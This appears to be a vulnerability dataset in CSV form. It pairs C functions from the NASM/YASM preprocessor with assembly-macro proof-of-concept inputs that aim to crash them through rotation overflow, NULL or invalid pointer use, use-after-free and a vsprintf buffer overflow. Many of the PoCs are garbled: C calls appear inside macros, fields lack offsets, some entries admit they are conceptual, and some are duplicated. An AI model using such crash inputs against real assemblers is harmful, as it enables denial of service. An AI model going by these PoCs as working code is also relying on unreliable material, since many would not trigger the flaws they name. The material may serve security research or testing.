Vulnerable Code,PoC Exploit Code,Vul_Index
"expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }","expand_mmac_params(Token * tline) { Token *t, *tt, **tail, *thead; tail = &thead; thead = NULL; while (tline) { if (tline->type == TOK_PREPROC_ID && (((tline->text[1] == '+' || tline->text[1] == '-') && tline->text[2]) || tline->text[1] == '%' || (tline->text[1] >= '0' && tline->text[1] <= '9'))) { char *text = NULL; int type = 0, cc; char tmpbuf[30]; char *second_text = NULL; int n, i; MMacro *mac; t = tline; tline = tline->next; second_text = strchr(t->text, ':'); mac = istk->mstk; while (mac && !mac->name) mac = mac->next_active; if (!mac) error(ERR_NONFATAL, '`%s': not in a macro call', t->text); else { if (second_text) { int end = atoi(second_text+1)-1; int is_fst = 1; int k; n = atoi(t->text + 1)-1; if (end < 0) end += mac->nparam; for (k = n; k <= end; k++) { if (k >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) k = (k + mac->rotate) % mac->nparam; tt = mac->params[k]; } if (tt) { if (!is_fst && mac->paramlen[k]) { *tail = new_Token(NULL, TOK_OTHER, ',', 0); tail = &(*tail)->next; } if (mac->paramlen[k]) is_fst = 0; for (i = 0; i < mac->paramlen[k]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } else { switch (t->text[1]) { case '0': type = TOK_NUMBER; sprintf(tmpbuf, '%ld', mac->nparam); text = nasm_strdup(tmpbuf); break; case '%': type = TOK_ID; sprintf(tmpbuf, '..@%lu.', mac->unique); text = nasm_strcat(tmpbuf, t->text + 2); break; case '-': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; if (inverse_ccs[cc] == -1) { error(ERR_NONFATAL, 'condition code `%s' is not invertible', conditions[cc]); text = NULL; } else text = nasm_strdup(conditions[inverse_ccs [cc]]); } break; case '+': n = atoi(t->text + 2) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } cc = find_cc(tt); if (cc == -1) { error(ERR_NONFATAL, 'macro parameter %d is not a condition code', n + 1); text = NULL; } else { type = TOK_ID; text = nasm_strdup(conditions[cc]); } break; default: n = atoi(t->text + 1) - 1; if (n >= mac->nparam) tt = NULL; else { if (mac->nparam > 1) n = (n + mac->rotate) % mac->nparam; tt = mac->params[n]; } if (tt) { for (i = 0; i < mac->paramlen[n]; i++) { *tail = new_Token(NULL, tt->type, tt->text, 0); tail = &(*tail)->next; tt = tt->next; } } text = NULL; } } } if (!text) { delete_Token(t); } else { *tail = t; tail = &t->next; t->type = type; nasm_free(t->text); t->text = text; t->mac = NULL; } continue; } else { t = *tail = tline; tline = tline->next; t->mac = NULL; tail = &t->next; } } *tail = NULL; t = thead; for (; t && (tt = t->next) != NULL; t = t->next) switch (t->type) { case TOK_WHITESPACE: if (tt->type == TOK_WHITESPACE) { t->next = delete_Token(tt); } break; case TOK_ID: if (tt->type == TOK_ID || tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; case TOK_NUMBER: if (tt->type == TOK_NUMBER) { char *tmp = nasm_strcat(t->text, tt->text); nasm_free(t->text); t->text = tmp; t->next = delete_Token(tt); } break; } return thead; }",vul17_1
,"%macro crash_yasm 0
    %define %$rotate 999999
    %rep 1
        %+1:1
    %endrep
%endmacro

crash_yasm",vul17_2
,"%macro crash_macro 1
    %define huge_rotate 2147483647
    %assign %$index 0
    %rep 10
        %rotate huge_rotate
        %xdefine param_%$index %1
        %assign %$index %$index+1
    %endrep
    %error ""Forcing rotation overflow""
%endmacro

crash_macro test_param",vul17_3
,"%macro crash_macro 1
    %define %+1 %+1
%endmacro

%macro setup 0-*
    %assign %$rotate 2147483647
    %assign %$nparam 1
    crash_macro %+1
%endmacro

setup",vul17_4
,"%macro crash_macro 1
    %define %$rotate 2147483647
    %define %$nparam 2
    %define %$params {1, 2}
    %rep 1
        %+0: %+2147483647
    %endrep
%endmacro

crash_macro 1",vul17_5
,"%macro trigger_vuln 0
    %define %+ 999999999
    %rep 1
        %+1:1
    %endrep
%endmacro

trigger_vuln",vul17_6
,"%macro crash_macro 1
    %rep 1
        %+1: %+1
    %endrep
%endmacro

%define %+1 0
%assign %$rotate 2147483647
crash_macro %+1",vul17_7
delete_Token(Token * t) { Token *next = t->next; nasm_free(t->text); t->next = freeTokens; freeTokens = t; return next;},"%macro crash_delete_token 0
    struc Token
        .next resq 1
        .text resq 1
    endstruc

    section .bss
    token_instance resb Token_size

    section .text
    %define t token_instance
    %assign t.next 0
    %assign t.text 0

    mov rdi, t
    call delete_Token
%endmacro

crash_delete_token",vul19_1
,"%macro crash_delete_token 0
    struc Token
        .next resq 1
        .text resq 1
    endstruc

    section .bss
    token_instance resb Token_size

    section .text
    %define t token_instance
    %assign t 0

    mov rdi, t
    call delete_Token
%endmacro

crash_delete_token",vul19_2
,"%macro corrupt_token 0
    %assign %$token 0
    %xdefine t %$token
    %xdefine t.next 0
%endmacro

corrupt_token",vul19_3
,"%macro crash_delete_token 0
    struc Token
        .next resq 1
        .text resq 1
    endstruc

    section .bss
    token_instance resb Token_size

    section .text
    %define t token_instance
    %assign t 0

    mov rdi, t
    call delete_Token
%endmacro

crash_delete_token",vul19_4
,"%macro crash_delete_token 0
    struc Token
        .next resq 1
        .text resq 1
    endstruc

    section .bss
    invalid_token resb Token_size

    section .text
    %define t invalid_token
    %assign t.next 0xFFFFFFFFFFFFFFFF
    %assign t.text 0xFFFFFFFFFFFFFFFF

    mov rdi, t
    call delete_Token
%endmacro

crash_delete_token",vul19_5
,"%macro crash_delete_token 0
    struc Token
        .next resq 1
        .text resq 1
    endstruc

    section .bss
    token_instance resb Token_size

    section .text
    %define t token_instance
    %assign t.next 0xFFFFFFFFFFFFFFFF
    %assign t.text 0x0

    mov rax, [t.next]
%endmacro

crash_delete_token",vul19_6
,"%macro crash_delete_token 0
    struc Token
        .next resq 1
        .text resq 1
    endstruc

    %assign %$token_ptr 0
    %define %$fake_token (%$token_ptr)

    %rep 1
        dd %$fake_token
    %endrep
%endmacro

crash_delete_token",vul19_7
,"%macro crash_delete_token 0
    struc Token
        .next resq 1
        .text resq 1
    endstruc

    %assign %$token_ptr 0x0
    %define t %$token_ptr
    %xdefine next [t + Token.next]
%endmacro

crash_delete_token",vul19_8
,"%macro trigger_delete_token_error 0
struc Token
    .next resq 1
    .text resq 1
endstruc

section .bss
token_instance resb Token_size

%define %$token ((Token token_instance))
mov qword [%$token.text], 0

%define delete_Token(token_ptr) \
    mov rdi, token_ptr \
    call simulated_delete_Token

section .text
global _start
_start:
    delete_Token(%$token)

simulated_delete_Token:
    mov rax, [rdi + Token.next]
    mov rcx, [rdi + Token.text]
    test rcx, rcx
    jz .skip_free
    call nasm_free
.skip_free:
    mov rax, [rdi + Token.next]
    mov [rdi + Token.next], rax
    ret
%endmacro

trigger_delete_token_error",vul19_9
"yasm_expr_create(yasm_expr_op op, yasm_expr__item *left,\n    yasm_expr__item *right, unsigned long line)\n{\n    yasm_expr *ptr, *sube;\n    unsigned long z;\n    ptr = yasm_xmalloc(sizeof(yasm_expr));\n\n    ptr->op = op;\n    ptr->numterms = 0;\n    ptr->terms[0].type = YASM_EXPR_NONE;\n    ptr->terms[1].type = YASM_EXPR_NONE;\n    if (left) {\n        ptr->terms[0] = *left;  /* structure copy */\n        z = (unsigned long)(left-itempool);\n        if (z>=31)\n            yasm_internal_error(N_(\""could not find expritem in pool\""));\n        itempool_used &= ~(1<<z);\n        ptr->numterms++;\n\n        /* Search downward until we find something *other* than an\n         * IDENT, then bring it up to the current level.\n         */\n        while (ptr->terms[0].type == YASM_EXPR_EXPR &&\n               ptr->terms[0].data.expn->op == YASM_EXPR_IDENT) {\n            sube = ptr->terms[0].data.expn;\n            ptr->terms[0] = sube->terms[0];     /* structure copy */\n            /*@-usereleased@*/\n            yasm_xfree(sube);\n            /*@=usereleased@*/\n        }\n    } else {\n        yasm_internal_error(N_(\""Right side of expression must exist\""));\n    }\n\n    if (right) {\n        ptr->terms[1] = *right; /* structure copy */\n        z = (unsigned long)(right-itempool);\n        if (z>=31)\n            yasm_internal_error(N_(\""could not find expritem in pool\""));\n        itempool_used &= ~(1<<z);\n        ptr->numterms++;\n\n        /* Search downward until we find something *other* than an\n         * IDENT, then bring it up to the current level.\n         */\n        while (ptr->terms[1].type == YASM_EXPR_EXPR &&\n               ptr->terms[1].data.expn->op == YASM_EXPR_IDENT) {\n            sube = ptr->terms[1].data.expn;\n            ptr->terms[1] = sube->terms[0];     /* structure copy */\n            /*@-usereleased@*/\n            yasm_xfree(sube);\n            /*@=usereleased@*/\n        }\n    }\n\n    ptr->line = line;\n\n    return expr_level_op(ptr, 1, 1, 0);","%macro trigger_expr_create 0
    %assign %$left_item yasm_xmalloc(sizeof(yasm_expr__item))
    %assign %$right_item yasm_xmalloc(sizeof(yasm_expr__item))

    [ %$left_item + yasm_expr__item.type ] db YASM_EXPR_EXPR
    [ %$left_item + yasm_expr__item.data.expn.op ] db YASM_EXPR_IDENT

    %assign %$sub_expr yasm_xmalloc(sizeof(yasm_expr))
    [ %$left_item + yasm_expr__item.data.expn ] dd %$sub_expr

    [ %$sub_expr + yasm_expr.type ] db YASM_EXPR_EXPR
    [ %$sub_expr + yasm_expr.op ] db YASM_EXPR_IDENT

    [ %$right_item + yasm_expr__item.type ] db YASM_EXPR_NONE

    yasm_expr_create YASM_EXPR_ADD, %$left_item, %$right_item, 0
%endmacro

trigger_expr_create",vul20_1
,"%macro crash_yasm_expr_create 0
    %define left_expr yasm_expr__item
    %define right_expr yasm_expr__item

    %assign left_expr.type YASM_EXPR_EXPR
    %assign left_expr.data.expn 0  ; Intentionally set to NULL to trigger dereference

    %assign right_expr.type YASM_EXPR_EXPR
    %assign right_expr.data.expn 0  ; Intentionally set to NULL to trigger dereference

    ; Call yasm_expr_create with crafted left and right expressions
    ; This should trigger a NULL pointer dereference when accessing left_expr.data.expn and right_expr.data.expn
    yasm_expr_create YASM_EXPR_ADD, left_expr, right_expr, 1
%endmacro

crash_yasm_expr_create",vul20_2
,"%macro crash_yasm_expr_create 0
    struc yasm_expr__item
        .type resb 1
        .data resb 8  ; Assuming 64-bit pointer for simplicity
    endstruc

    section .data
    left_item: 
        db YASM_EXPR_EXPR  ; Set type to YASM_EXPR_EXPR
        dq fake_expr       ; Point to a crafted fake expression

    fake_expr:
        db YASM_EXPR_IDENT ; Set operation to YASM_EXPR_IDENT
        dq 0               ; Null pointer to simulate bad dereference

    %define left yasm_expr__item [left_item]
    %define right NULL

    ; Simulate call to yasm_expr_create with crafted left item and NULL right
    extern yasm_expr_create
    call yasm_expr_create, YASM_EXPR_ADD, left, right, 0
%endmacro

crash_yasm_expr_create",vul20_3
,"%macro trigger_expr_create 0
    %define fake_left yasm_expr__item
    %define fake_right yasm_expr__item

    %struc yasm_expr__item
        type resb 1
        data resb 8  ; Simulate pointer to another yasm_expr
    %endstruc

    %struc yasm_expr
        op resb 1
        numterms resb 1
        terms resb 16  ; Simulate two yasm_expr__item structures
        line resd 1
    %endstruc

    %assign %$left_offset 0
    %assign %$right_offset 8

    ; Create fake items with controlled content
    fake_left:
        db YASM_EXPR_EXPR  ; type
        dq fake_left       ; data pointing to itself to create infinite loop

    fake_right:
        db YASM_EXPR_EXPR  ; type
        dq fake_right      ; data pointing to itself to create infinite loop

    ; Call the vulnerable function with crafted pointers
    %define yasm_expr_create(op, left, right, line) \
        db op \
        dd left, right, line

    ; Trigger the vulnerability
    yasm_expr_create YASM_EXPR_ADD, fake_left, fake_right, 0
%endmacro

trigger_expr_create",vul20_4
,"%macro crash_yasm_expr_create 0
    %define fake_left yasm_expr__item
    %define fake_right yasm_expr__item

    %struc yasm_expr__item
        type resb 1
        data resb 8
    %endstruc

    %struc yasm_expr
        op resb 1
        numterms resb 1
        terms resb 16
        line resd 1
    %endstruc

    fake_left:
        db YASM_EXPR_EXPR
        dq fake_left

    fake_right:
        db YASM_EXPR_EXPR
        dq fake_right

    %define yasm_expr_create(op, left, right, line) \
        db op, left, right, line

    yasm_expr_create 0, fake_left, fake_right, 0
%endmacro

crash_yasm_expr_create",vul20_5
,"%macro trigger_expr_create 0
    struc yasm_expr__item
        .type resb 1
        .data resb 8
    endstruc

    %assign %$left yasm_expr__item
    %assign %$right yasm_expr__item

    db YASM_EXPR_EXPR
    dq %$left

    db YASM_EXPR_NONE
    dq 0

    %assign %$op YASM_EXPR_ADD
    %assign %$line 123
%endmacro

trigger_expr_create",vul20_6
,"%macro crash_yasm_expr_create 0
    ; Simulate a scenario where yasm_expr_create is called with a left term that causes recursive copying
    ; Setup a mock environment to simulate the condition
    %define yasm_expr_op YASM_EXPR_IDENT
    %define yasm_expr__item_left 0x1000  ; Mock address
    %define yasm_expr__item_right 0x2000 ; Mock address
    %define line_number 42

    ; Mock items in the itempool to trigger the recursive copy
    %assign itempool 0x3000
    %assign itempool_used 0xFFFFFFFF

    ; Directly invoke the yasm_expr_create with controlled parameters
    ; This is a conceptual call, in real testing, this would be setup by manipulating memory directly or other means
    yasm_expr_create yasm_expr_op, yasm_expr__item_left, yasm_expr__item_right, line_number

    ; The above line is conceptual and would not directly translate to assembly
    ; It represents the need to setup a test where yasm_expr_create is called with a crafted environment
%endmacro

; Trigger the crash
crash_yasm_expr_create",vul20_7
,"%macro trigger_expr_create 0
    struc yasm_expr__item
        .type resb 1
        .data resb 8
    endstruc

    %assign left_item yasm_expr__item
    %assign right_item yasm_expr__item

    db YASM_EXPR_EXPR
    dq left_item

    db YASM_EXPR_EXPR
    dq right_item

    %rep 1
        db YASM_EXPR_EXPR
        dq left_item
    %endrep
%endmacro

trigger_expr_create",vul20_8
,"%macro trigger_expr_create 0
    ; Simulate the creation of an expression with recursive IDENT references
    ; Define a mock structure that simulates the behavior of yasm_expr__item and yasm_expr
    struc yasm_expr__item
        .type resb 1
        .data resb 8  ; Assuming 64-bit pointer for simplicity
    endstruc

    struc yasm_expr
        .op resb 1
        .numterms resb 1
        .terms resb 16  ; Two yasm_expr__item instances
        .line resd 1
    endstruc

    ; Allocate memory for expr items simulating a pool
    %assign expr_item_size yasm_expr__item_size
    %assign expr_size yasm_expr_size

    ; Create two expr items, left and right
    left_item: resb expr_item_size
    right_item: resb expr_item_size

    ; Setup left_item to simulate YASM_EXPR_EXPR with a self-referencing data pointer
    db YASM_EXPR_EXPR  ; type
    dq left_item       ; data pointing to itself, simulating recursive IDENT

    ; Setup right_item normally (not used in the vulnerability trigger)
    db YASM_EXPR_NONE  ; type
    dq 0               ; null data

    ; Call the vulnerable function with crafted left_item
    ; Normally, we would call the function directly if we could execute this,
    ; but for PoC, we simulate what would happen.
    ; yasm_expr_create(YASM_EXPR_OP, left_item, right_item, 1234)

    ; The above setup should trigger infinite recursion or misuse of freed memory
    ; when yasm_expr_create processes left_item.
%endmacro

trigger_expr_create",vul20_9
"pp_getline(void) { char *line; Token *tline; while (1) { tline = NULL; if (first_line) { poke_predef(predef); poke_predef(stddef); poke_predef(builtindef); first_line = 0; } if (!istk) return NULL; while (istk->expansion && istk->expansion->finishes) { Line *l = istk->expansion; if (!l->finishes->name && l->finishes->in_progress > 1) { Line *ll; l->finishes->in_progress--; for (l = l->finishes->expansion; l; l = l->next) { Token *t, *tt, **tail; ll = nasm_malloc(sizeof(Line)); ll->next = istk->expansion; ll->finishes = NULL; ll->first = NULL; tail = &ll->first; for (t = l->first; t; t = t->next) { if (t->text || t->type == TOK_WHITESPACE) { tt = *tail = new_Token(NULL, t->type, t->text, 0); tail = &tt->next; } } istk->expansion = ll; } } else { if (defining) { if (defining->name) error(ERR_PANIC, 'defining with name in expansion'); else if (istk->mstk->name) error(ERR_FATAL, '`%%rep' without `%%endrep' within expansion of macro `%s'', istk->mstk->name); } MMacro *m = istk->mstk; istk->mstk = m->next_active; if (m->name) { nasm_free(m->params); free_tlist(m->iline); nasm_free(m->paramlen); l->finishes->in_progress = FALSE; } else free_mmacro(m); istk->expansion = l->next; nasm_free(l); list->downlevel(LIST_MACRO); } } while (1) { if (istk->expansion) { char *p; Line *l = istk->expansion; if (istk->mstk) istk->mstk->lineno++; tline = l->first; istk->expansion = l->next; nasm_free(l); p = detoken(tline, FALSE); list->line(LIST_MACRO, p); nasm_free(p); break; } line = read_line(); if (line) { line = prepreproc(line); tline = tokenise(line); nasm_free(line); break; } Include *i = istk; if (i->fp != first_fp) fclose(i->fp); if (i->conds) error(ERR_FATAL, 'expected `%%endif' before end of file'); if (i->next) { nasm_src_set_linnum(i->lineno); nasm_free(nasm_src_set_fname(nasm_strdup(i->fname))); } istk = i->next; list->downlevel(LIST_INCLUDE); nasm_free(i->fname); nasm_free(i); if (!istk) return NULL; if (istk->expansion && istk->expansion->finishes) break; } if (!defining && !(istk->conds && !emitting(istk->conds->state))) tline = expand_mmac_params(tline); if (do_directive(tline) == DIRECTIVE_FOUND) { continue; } else if (defining) { Line *l = nasm_malloc(sizeof(Line)); l->next = defining->expansion; l->first = tline; l->finishes = FALSE; defining->expansion = l; continue; } else if (istk->conds && !emitting(istk->conds->state)) { free_tlist(tline); continue; } else if (istk->mstk && !istk->mstk->in_progress) { free_tlist(tline); continue; } else { tline = expand_smacro(tline); if (!expand_mmacro(tline)) { if (tasm_compatible_mode) tline = tasm_join_tokens(tline); line = detoken(tline, TRUE); free_tlist(tline); break; } else { continue; } } } return line; }","%macro trigger_use_after_free 0
    ; Simulate conditions leading to `l` being freed before accessing `l->first`
    struc Line
        .next resq 1
        .finishes resq 1
        .first resq 1
    endstruc

    ; Allocate a Line structure and immediately free it to simulate use-after-free
    %define l nasm_malloc(sizeof(Line))
    %assign l.next NULL
    %assign l.finishes NULL
    %assign l.first NULL

    ; Free the structure to simulate use-after-free
    nasm_free(l)

    ; Now, simulate the access that would use the freed structure
    %define tline l.first
%endmacro

trigger_use_after_free",vul21_1
,"%macro trigger_pp_getline_crash 0
    ; Simulate a scenario where `l` points to an invalid Line structure
    struc BadLine
        .next resq 1
        .finishes resq 1
        .first resq 1  ; Deliberately point to an invalid memory location
    endstruc

    ; Allocate a BadLine structure and manipulate the stack to make `istk->expansion` point to it
    %define fake_line nasm_malloc(sizeof(BadLine))
    mov [fake_line+BadLine.first], 0xDEADBEEF  ; Invalid memory address

    ; Assume `istk` is a register holding the address of the current include stack
    mov [istk+istk.expansion], fake_line

    ; Trigger the vulnerable function, expecting it to use the manipulated `l->first`
    call pp_getline
%endmacro

trigger_pp_getline_crash",vul21_2
,"%macro trigger_pp_getline_crash 0
    ; Simulate a scenario where istk->expansion is manipulated
    ; to point to a crafted Line structure with an invalid 'first' pointer
    struc Line
        .next resq 1
        .finishes resq 1
        .first resq 1    ; This will be the 'tline' causing the crash
    endstruc

    ; Allocate memory for a fake Line structure
    %define fake_line nasm_malloc(sizeof(Line))
    %define invalid_pointer 0x123456  ; Deliberately invalid pointer for demonstration

    ; Set up the fake Line structure
    [fake_line+Line.first] dq invalid_pointer

    ; Manipulate istk->expansion to point to our fake Line
    %define istk_expansion_offset  ; Offset needs to be determined based on istk structure
    [istk+istk_expansion_offset] dq fake_line

    ; Trigger the vulnerable function which should access the invalid 'first' pointer
    ; Normally, this would be part of a larger sequence where pp_getline is called
    ; This is a conceptual demonstration; actual triggering might need more context setup
%endmacro

trigger_pp_getline_crash",vul21_3
,"%macro crash_pp_getline 0
    ; Simulate a scenario where istk->expansion is manipulated to point to an invalid Line structure
    struc BadLine
        .next resq 1
        .finishes resq 1
        .first resq 1   ; Deliberately set to NULL or an invalid pointer
    endstruc

    ; Allocate a BadLine structure and set it as the current istk->expansion
    %define fake_line nasm_malloc(sizeof(BadLine))
    [fake_line].BadLine.first equ 0  ; Set to NULL to trigger null dereference

    ; Force the YASM preprocessor to use this fake line structure
    %define istk.expansion fake_line

    ; Trigger the pp_getline function which will attempt to access .first (NULL)
    %rep 1
        db 0
    %endrep
%endmacro

crash_pp_getline",vul21_7
,"%macro crash_pp_getline 0
    ; Trigger recursive macro expansion without proper termination
    %rep 1000000
        %define tricky_macro %1
    %endrep

    ; Define a macro that simulates the problematic behavior in pp_getline
    %define simulate_pp_getline_behavior
        %assign l_first NULL  ; Simulate an uninitialized or invalid pointer
        mov rax, [l_first]   ; Attempt to access memory through the invalid pointer
    %endmacro

    ; Invoke the macro to simulate the behavior and trigger the crash
    simulate_pp_getline_behavior
%endmacro

; Execute the macro to trigger the crash
crash_pp_getline",vul21_8
,"%macro setup_invalid_expansion 0
    struc bad_expansion
        .next resb 1
        .finishes resb 1
        .first resb 1
    endstruc

    %assign %$expansion_offset bad_expansion.first - bad_expansion.next
    %define %$create_bad_expansion() \
        [rel istk+istk.expansion+%$expansion_offset]: dq bad_expansion

    %$create_bad_expansion
%endmacro

%macro trigger_unhandled_memory_error 0
    setup_invalid_expansion
    %rep 1
        db 0x90 ; NOP - simulate some operations
    %endrep
%endmacro

trigger_unhandled_memory_error",vul21_9
"static void error(int severity, const char *fmt, ...) { va_list arg; char buff[1024]; if (istk && istk->conds && !emitting(istk->conds->state)) return; va_start(arg, fmt); #ifdef HAVE_VSNPRINTF vsnprintf(buff, sizeof(buff), fmt, arg); #else vsprintf(buff, fmt, arg); #endif va_end(arg); if (istk && istk->mstk && istk->mstk->name) _error(severity | ERR_PASS1, \""(%s:%d) %s\"", istk->mstk->name, istk->mstk->lineno, buff); else _error(severity | ERR_PASS1, \""%s\"", buff);","%macro trigger_error 0
    %assign %$long_string_length 1500
    %define %$long_string `rep 1500 dup ('A')`
    %error %$long_string
%endmacro

trigger_error",vul22_1
,"%macro crash_error 1
    %xdefine %$name %1
    %assign %$lineno %1
    crash_error %1
%endmacro

%macro setup_error 0
    %define istk.mstk.name %$name
    %define istk.mstk.lineno %$lineno
    %error ""Triggering error with invalid stack setup""
%endmacro

crash_error 1000000
setup_error",vul22_2
,"%macro generate_long_string 0
    %rep 300  ; Repeat the string concatenation 300 times
        %assign i i+1
        %define str str %+ ""VeryLongString""
    %endrep
    %error str  ; Trigger the error function with the long string
%endmacro

generate_long_string",vul22_3
,"%macro generate_long_error 0
    %rep 2048  ; Repeat the following line 2048 times to generate a long string
        db 'A'
    %endrep
    db 0       ; Null-terminate the string
%endmacro

%macro trigger_error 0
    %assign %$long_string generate_long_error
    %error ""Error: %s"", %$long_string
%endmacro

trigger_error",vul22_4
,"%macro generate_long_string 0
    %rep 300  ; Repeat the string concatenation 300 times
        %assign i i+1
        %define str str %+ ""A very long string to cause overflow ""
    %endrep
%endmacro

%macro trigger_error 0
    generate_long_string
    %error str  ; Trigger the error function with the expanded long string
%endmacro

trigger_error",vul22_5
,"%macro trigger_error 0
    struc trigger_overflow
        .long_string resb 2048  ; Reserve a buffer larger than the one in the error function
    endstruc

    %assign %$long_string_offset trigger_overflow.long_string

    ; Simulate a scenario where vsprintf might be called with a very long input string
    db ""A""  ; Start of a long string
    times 2048 db ""A""  ; Fill with 'A' to ensure overflow
    db 0    ; Null terminator for the string

    ; Assuming a hypothetical directive or macro that incorrectly handles string length
    %error ""Extremely long error message: %s"", (%$long_string_offset)
%endmacro

trigger_error",vul22_6
